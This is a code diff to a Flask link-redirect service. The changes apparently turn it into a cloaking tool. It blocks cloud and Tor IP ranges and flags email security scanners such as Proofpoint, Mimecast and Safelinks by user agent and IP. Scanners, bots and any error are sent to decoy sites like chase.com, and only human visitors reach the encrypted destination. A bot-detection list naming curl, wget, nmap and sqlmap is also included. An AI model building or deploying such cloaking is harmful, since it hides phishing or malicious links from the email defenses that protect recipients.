@@ -30,7 +30,7 @@ import sys
 app = Flask(__name__)
 load_dotenv()
 
-# Configure logging for Vercel
+# Configure logging
 logging.basicConfig(
     level=logging.DEBUG,
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -57,17 +57,30 @@ def get_azure_cidr_url():
     date_str = datetime.now().strftime("%Y%m%d")
     return f"{base_url}{date_str}.json"
 AZURE_CIDR_URL = get_azure_cidr_url()
+OVH_CIDR_URL = "https://www.ovhcloud.com/en-ie/network/ip-ranges/"
+GOOGLE_CIDR_URL = "https://www.gstatic.com/ipranges/cloud.json"
+DIGITALOCEAN_CIDR_URL = "https://www.digitalocean.com/docs/networking/ip-ranges/"
+HETZNER_CIDR_URL = "https://www.hetzner.com/en/cloud/ip-ranges"
+LINODE_CIDR_URL = "https://www.linode.com/docs/guides/networking/ip-ranges/"
+VULTR_CIDR_URL = "https://www.vultr.com/company/ip-ranges/"
+TOR_EXIT_URL = "https://check.torproject.org/torbulkexitlist"
+ABUSEIPDB_API_KEY = os.getenv("ABUSEIPDB_API_KEY", "")  # Set in environment
 
 # Anti-bot settings
 SUSPICIOUS_UA_PATTERNS = [
     r'bot', r'crawler', r'spider', r'scanner', r'curl', r'wget', r'python-requests',
     r'httpclient', r'zgrab', r'masscan', r'nmap', r'probe', r'sqlmap'
 ]
-REQUIRED_HEADERS = ['Accept', 'Accept-Language', 'Connection']
+SCANNER_UA_PATTERNS = [
+    r'microsoft office', r'proofpoint', r'barracuda', r'safelink', r'zscaler', r'mimecast'
+]
+REQUIRED_HEADERS = ['Accept', 'Accept-Language', 'Connection', 'Accept-Encoding', 'Referer', 'DNT']
 BLOCKED_CIDR_CACHE_KEY = "blocked_cidr"
-BLOCKED_CIDR_REFRESH_INTERVAL = 7200  # 2 hours to reduce Vercel timeouts
+SCANNER_ALLOWLIST_KEY = "scanner_allowlist"
+BLOCKED_CIDR_REFRESH_INTERVAL = 86400  # 24 hours
 RISK_SCORE_THRESHOLD = 75
 MAX_PAYLOAD_PADDING = 32
+COOKIE_TOKEN_TTL = 600  # 10 minutes
 
 # Local CIDR fallback
 LOCAL_CIDR_FALLBACK = [
@@ -217,6 +230,51 @@ def fetch_blocked_cidrs():
         except Exception as e:
             logger.warning(f"Failed to fetch Azure CIDRs: {str(e)}")
 
+        # Fetch OVH CIDRs (example, may need parsing)
+        try:
+            ovh_response = requests.get(OVH_CIDR_URL, timeout=5)
+            ovh_response.raise_for_status()
+            # OVH may require parsing HTML or specific format
+            for line in ovh_response.text.splitlines():
+                if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$', line):
+                    blocked_cidrs.append(ipaddress.ip_network(line.strip(), strict=False))
+        except Exception as e:
+            logger.warning(f"Failed to fetch OVH CIDRs: {str(e)}")
+
+        # Fetch Google Cloud CIDRs
+        try:
+            google_response = requests.get(GOOGLE_CIDR_URL, timeout=5)
+            google_response.raise_for_status()
+            google_data = google_response.json()
+            for prefix in google_data.get('prefixes', []):
+                cidr = prefix.get('ipv4Prefix') or prefix.get('ipv6Prefix')
+                if cidr:
+                    blocked_cidrs.append(ipaddress.ip_network(cidr, strict=False))
+        except Exception as e:
+            logger.warning(f"Failed to fetch Google Cloud CIDRs: {str(e)}")
+
+        # Fetch DigitalOcean, Hetzner, Linode, Vultr (similar parsing)
+        # Note: These may require specific parsing logic based on response format
+        for url in [DIGITALOCEAN_CIDR_URL, HETZNER_CIDR_URL, LINODE_CIDR_URL, VULTR_CIDR_URL]:
+            try:
+                response = requests.get(url, timeout=5)
+                response.raise_for_status()
+                for line in response.text.splitlines():
+                    if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$|^[0-9a-f:]+/\d+$', line):
+                        blocked_cidrs.append(ipaddress.ip_network(line.strip(), strict=False))
+            except Exception as e:
+                logger.warning(f"Failed to fetch CIDRs from {url}: {str(e)}")
+
+        # Fetch Tor exit nodes
+        try:
+            tor_response = requests.get(TOR_EXIT_URL, timeout=5)
+            tor_response.raise_for_status()
+            for line in tor_response.text.splitlines():
+                if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+$', line):
+                    blocked_cidrs.append(ipaddress.ip_network(f"{line.strip()}/32", strict=False))
+        except Exception as e:
+            logger.warning(f"Failed to fetch Tor exit nodes: {str(e)}")
+
         # Fetch malicious CIDRs
         try:
             blocklist_response = requests.get(BLOCKLIST_URL, timeout=5)
@@ -241,6 +299,24 @@ def fetch_blocked_cidrs():
             if cached:
                 return [ipaddress.ip_network(cidr) for cidr in json.loads(cached)]
         return LOCAL_CIDR_FALLBACK
+
+# Scanner allowlist management
+def update_scanner_allowlist():
+    try:
+        # Example: Populate from logs or known scanner IPs
+        scanner_ips = [
+            "13.107.6.0/24",  # Example Microsoft 365 range
+            "8.8.8.8/32"      # Example Google range
+            # Add Barracuda, Proofpoint, etc. ranges from logs
+        ]
+        if valkey_client:
+            valkey_client.delete(SCANNER_ALLOWLIST_KEY)
+            for ip in scanner_ips:
+                valkey_client.sadd(SCANNER_ALLOWLIST_KEY, ip)
+            valkey_client.expire(SCANNER_ALLOWLIST_KEY, BLOCKED_CIDR_REFRESH_INTERVAL)
+        logger.debug("Updated scanner allowlist")
+    except Exception as e:
+        logger.warning(f"Failed to update scanner allowlist: {str(e)}")
 
 # Anti-bot utilities
 def calculate_request_entropy(headers, query_params):
@@ -272,16 +348,31 @@ def is_suspicious_request():
     try:
         ip_addr = ipaddress.ip_address(ip)
         if any(ip_addr in cidr for cidr in blocked_cidrs):
-            risk_score += 50
             logger.debug(f"IP {ip} in blocked CIDR")
+            return redirect("https://www.chase.com", code=302)
     except ValueError:
         logger.warning(f"Invalid IP address: {ip}")
         risk_score += 20
+
+    # Check scanner allowlist
+    is_scanner = False
+    if valkey_client:
+        scanner_ips = valkey_client.smembers(SCANNER_ALLOWLIST_KEY) or []
+        try:
+            ip_addr = ipaddress.ip_address(ip)
+            if any(ip_addr in ipaddress.ip_network(cidr, strict=False) for cidr in scanner_ips):
+                logger.debug(f"IP {ip} in scanner allowlist")
+                is_scanner = True
+        except ValueError:
+            pass
 
     # User-Agent analysis
     if any(re.search(pattern, ua, re.IGNORECASE) for pattern in SUSPICIOUS_UA_PATTERNS):
         risk_score += 30
         logger.debug(f"Suspicious User-Agent: {ua}")
+    if any(re.search(pattern, ua, re.IGNORECASE) for pattern in SCANNER_UA_PATTERNS):
+        is_scanner = True
+        logger.debug(f"Scanner User-Agent: {ua}")
 
     # Header validation
     missing_headers = [h for h in REQUIRED_HEADERS if h not in headers]
@@ -295,14 +386,60 @@ def is_suspicious_request():
         risk_score += 25
         logger.debug(f"Low request entropy: {entropy}")
 
-    # Request timing
+    # Behavioral analysis
     if valkey_client:
-        last_request_key = f"last_request:{ip}"
-        last_time = valkey_client.get(last_request_key)
-        if last_time and (time.time() - float(last_time) < 0.01):
-            risk_score += 15
-            logger.debug(f"Rapid request from IP: {ip}")
-        valkey_client.setex(last_request_key, 60, time.time())
+        request_key = f"requests:{ip}:link"
+        valkey_client.lpush(request_key, str(time.time()))
+        valkey_client.ltrim(request_key, 0, 9)  # Keep last 10 requests
+        valkey_client.expire(request_key, 30)
+        recent_requests = valkey_client.lrange(request_key, 0, -1)
+        if len(recent_requests) > 3:
+            timestamps = [float(t) for t in recent_requests]
+            if max(timestamps) - min(timestamps) < 30:
+                risk_score += 30
+                logger.debug(f"Rapid link access from IP: {ip}")
+
+    # Fingerprint analysis
+    fingerprint = generate_request_fingerprint()
+    if valkey_client:
+        fingerprint_key = f"fingerprint:{fingerprint}"
+        valkey_client.sadd(fingerprint_key, ip)
+        valkey_client.expire(fingerprint_key, 3600)
+        if valkey_client.scard(fingerprint_key) > 5:
+            risk_score += 50
+            logger.debug(f"Repeated fingerprint from IP: {ip}")
+
+    # IP reputation
+    if ABUSEIPDB_API_KEY:
+        try:
+            cached_rep = valkey_client.get(f"ip_reputation:{ip}")
+            if cached_rep is None:
+                response = requests.get(
+                    f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}",
+                    headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
+                    timeout=5
+                )
+                response.raise_for_status()
+                score = response.json().get("data", {}).get("abuseConfidenceScore", 0)
+                valkey_client.setex(f"ip_reputation:{ip}", 3600, score)
+            else:
+                score = int(cached_rep)
+            if score > 50:
+                risk_score += 20
+                logger.debug(f"High abuse score for IP {ip}: {score}")
+        except Exception as e:
+            logger.warning(f"Failed to check IP reputation for {ip}: {str(e)}")
+
+    # Geo-IP (example, requires MaxMind GeoLite2 database)
+    # Note: You'd need to download GeoLite2-City.mmdb and use geoip2 library
+    # try:
+    #     reader = geoip2.database.Reader('GeoLite2-City.mmdb')
+    #     response = reader.city(ip)
+    #     if response.country.iso_code not in ['US', 'CA']:  # Adjust for your target region
+    #         risk_score += 20
+    #         logger.debug(f"Unexpected Geo-IP for {ip}: {response.country.iso_code}")
+    # except Exception as e:
+    #     logger.warning(f"Geo-IP check failed for {ip}: {str(e)}")
 
     # Store risk score
     if valkey_client:
@@ -312,7 +449,15 @@ def is_suspicious_request():
         except Exception as e:
             logger.warning(f"Failed to store risk score for IP {ip}: {str(e)}")
 
-    return risk_score >= RISK_SCORE_THRESHOLD
+    if risk_score >= RISK_SCORE_THRESHOLD:
+        logger.warning(f"Blocked suspicious request from {ip}: risk_score={risk_score}")
+        return redirect("https://www.chase.com", code=302)
+
+    if is_scanner:
+        logger.debug(f"Scanner detected for IP {ip}")
+        return redirect("https://www.web3.com", code=302)
+
+    return None
 
 # Dynamic rate limiting
 def dynamic_rate_limit(base_limit=5, base_per=60):
@@ -334,7 +479,7 @@ def dynamic_rate_limit(base_limit=5, base_per=60):
                     logger.debug(f"Rate limit set for {ip}: 1/{limit}")
                 elif int(current) >= limit:
                     logger.warning(f"Rate limit exceeded for IP: {ip}, risk_score: {risk_score}")
-                    abort(429, "Too Many Requests")
+                    return redirect("https://www.chase.com", code=302)
                 else:
                     valkey_client.incr(key)
                     logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit}")
@@ -415,7 +560,7 @@ def decrypt_payload(encrypted):
         if padding_length > MAX_PAYLOAD_PADDING or len(padded_payload) < 4 + padding_length:
             raise ValueError("Invalid padding length")
         
-        # Extract JSON payload (excluding padding length and padding)
+        # Extract JSON payload
         payload_bytes = padded_payload[4:-padding_length]
         
         # Decode JSON
@@ -473,11 +618,12 @@ def get_base_domain():
 @app.before_request
 def block_suspicious_requests():
     try:
-        if is_suspicious_request():
-            logger.warning(f"Blocked suspicious request from {request.remote_addr}: {request.url}")
-            abort(403, "Access Denied")
+        result = is_suspicious_request()
+        if result:
+            return result
     except Exception as e:
         logger.error(f"Error in block_suspicious_requests: {str(e)}", exc_info=True)
+        return redirect("https://www.chase.com", code=302)
 
 @app.route("/login", methods=["GET", "POST"])
 @dynamic_rate_limit(base_limit=5, base_per=60)
@@ -897,6 +1043,35 @@ def delete_url(url_id):
             </html>
         """, error=str(e)), 500
 
+@app.route("/scanner-trap/<token>", methods=["GET"])
+@dynamic_rate_limit(base_limit=5, base_per=60)
+def scanner_trap(token):
+    try:
+        ip = request.remote_addr
+        logger.debug(f"Scanner trap hit by IP: {ip}, token: {token}")
+        if valkey_client:
+            valkey_client.setex(f"scanner:{ip}", 3600, "1")
+            logger.info(f"Marked IP {ip} as scanner")
+        return redirect("https://www.web3.com", code=302)
+    except Exception as e:
+        logger.error(f"Error in scanner_trap: {str(e)}", exc_info=True)
+        return redirect("https://www.web3.com", code=302)
+
+@app.route("/bot-trap/<token>", methods=["GET"])
+@dynamic_rate_limit(base_limit=5, base_per=60)
+def bot_trap(token):
+    try:
+        ip = request.remote_addr
+        logger.debug(f"Bot trap hit by IP: {ip}, token: {token}")
+        if valkey_client:
+            valkey_client.hincrby(f"risk_score:{ip}", "score", 50)
+            valkey_client.expire(f"risk_score:{ip}", 3600)
+            logger.info(f"Increased risk score for IP {ip} due to bot trap")
+        return redirect("https://www.chase.com", code=302)
+    except Exception as e:
+        logger.error(f"Error in bot_trap: {str(e)}", exc_info=True)
+        return redirect("https://www.chase.com", code=302)
+
 @app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
 @dynamic_rate_limit(base_limit=5, base_per=60)
 def redirect_handler(username, endpoint, encrypted_payload, path_segment):
@@ -904,6 +1079,8 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         base_domain = get_base_domain()
         logger.debug(f"Redirect handler: username={username}, endpoint={endpoint}, payload={encrypted_payload[:20]}...")
         url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
+        ip = request.remote_addr
+        ua = request.headers.get('User-Agent', '').lower()
 
         # Validate payload length
         if not encrypted_payload or len(encrypted_payload) < 32:
@@ -926,17 +1103,52 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 </html>
             """), 400
 
+        # Cookie-based token check
+        token = request.cookies.get('bot_check_token')
+        is_first_request = False
+        if not token and valkey_client:
+            token = secrets.token_hex(16)
+            valkey_client.setex(f"token:{ip}:{token}", COOKIE_TOKEN_TTL, "1")
+            is_first_request = True
+            logger.debug(f"Set new cookie token for IP {ip}: {token}")
+        elif valkey_client and not valkey_client.exists(f"token:{ip}:{token}"):
+            logger.warning(f"Invalid or missing cookie token for IP {ip}")
+            return redirect("https://www.chase.com", code=302)
+
+        # Check for scanner
+        is_scanner = False
+        if valkey_client and valkey_client.exists(f"scanner:{ip}"):
+            is_scanner = True
+        elif any(re.search(pattern, ua, re.IGNORECASE) for pattern in SCANNER_UA_PATTERNS):
+            is_scanner = True
+            if valkey_client:
+                valkey_client.setex(f"scanner:{ip}", 3600, "1")
+        elif valkey_client:
+            scanner_ips = valkey_client.smembers(SCANNER_ALLOWLIST_KEY) or []
+            try:
+                ip_addr = ipaddress.ip_address(ip)
+                if any(ip_addr in ipaddress.ip_network(cidr, strict=False) for cidr in scanner_ips):
+                    is_scanner = True
+                    valkey_client.setex(f"scanner:{ip}", 3600, "1")
+            except ValueError:
+                pass
+
         # Random delay
         time.sleep(random.uniform(0.1, 0.5))
 
-        if valkey_client:
-            try:
-                analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
-                if analytics_enabled:
-                    valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
-            except Exception as e:
-                logger.warning(f"Failed to update analytics: {str(e)}")
+        # Analytics tracking
+        should_count_click = False
+        if valkey_client and not is_scanner:
+            analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
+            if analytics_enabled:
+                click_key = f"click:{ip}:{ua}:{url_id}"
+                if not valkey_client.exists(click_key):
+                    valkey_client.setex(click_key, 600, "1")
+                    should_count_click = True
+                    # Delay for analytics
+                    time.sleep(2.0)
 
+        # Process payload
         encrypted_payload = urllib.parse.unquote(encrypted_payload)
         uuid_suffix_pattern = r'(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}[0-9a-f]+)?$'
         cleaned_path_segment = re.sub(uuid_suffix_pattern, '', path_segment)
@@ -983,39 +1195,34 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
             expiry = data.get("expiry", float('inf'))
             if not redirect_url or not re.match(r"^https?://", redirect_url):
                 logger.error(f"Invalid redirect URL: {redirect_url}")
-                abort(400, "Invalid redirect URL")
+                return redirect("https://www.chase.com", code=302)
             if time.time() > expiry:
                 logger.warning("URL expired")
                 if valkey_client:
                     valkey_client.delete(f"url_payload:{url_id}")
-                abort(410, "URL has expired")
+                return redirect("https://www.chase.com", code=302)
         except json.JSONDecodeError as e:
             logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
-            abort(400, "Invalid payload")
+            return redirect("https://www.chase.com", code=302)
 
-        final_url = f"{redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}"
-        logger.info(f"Redirecting to {final_url}")
-        return redirect(final_url, code=302)
+        # Increment analytics for valid clicks
+        if should_count_click and valkey_client:
+            valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
+            logger.debug(f"Incremented click count for URL {url_id}")
+
+        # Set cookie for first request
+        response = make_response(redirect(f"{redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}", code=302))
+        if is_first_request:
+            response.set_cookie('bot_check_token', token, max_age=COOKIE_TOKEN_TTL, secure=True, httponly=True, samesite='Strict')
+        logger.info(f"Redirecting to {redirect_url.rstrip('/')}/{cleaned_path_segment.lstrip('/')}")
+        
+        if is_scanner:
+            return redirect("https://www.web3.com", code=302)
+        
+        return response
     except Exception as e:
         logger.error(f"Error in redirect_handler: {str(e)}", exc_info=True)
-        return render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Internal Server Error</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-            </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
-                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
-                    <p class="text-gray-600">Please try again later or check server logs.</p>
-                </div>
-            </body>
-            </html>
-        """, error=str(e)), 500
+        return redirect("https://www.chase.com", code=302)
 
 @app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"])
 @dynamic_rate_limit(base_limit=5, base_per=60)
@@ -1027,24 +1234,7 @@ def redirect_handler_no_subdomain(endpoint, encrypted_payload, path_segment):
         return redirect_handler(username, endpoint, encrypted_payload, path_segment)
     except Exception as e:
         logger.error(f"Error in redirect_handler_no_subdomain: {str(e)}", exc_info=True)
-        return render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Internal Server Error</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-            </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
-                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
-                    <p class="text-gray-600">Please try again later or check server logs.</p>
-                </div>
-            </body>
-            </html>
-        """, error=str(e)), 500
+        return redirect("https://www.chase.com", code=302)
 
 @app.route("/favicon.ico")
 def favicon():
@@ -1071,6 +1261,17 @@ def catch_all(path):
         </body>
         </html>
     """), 404
+
+@app.route("/update-cidrs", methods=["GET"])
+def update_cidrs():
+    try:
+        fetch_blocked_cidrs()
+        update_scanner_allowlist()
+        logger.info("Updated CIDRs and scanner allowlist")
+        return jsonify({"status": "ok"}), 200
+    except Exception as e:
+        logger.error(f"Error updating CIDRs: {str(e)}", exc_info=True)
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 if __name__ == "__main__":
     try:
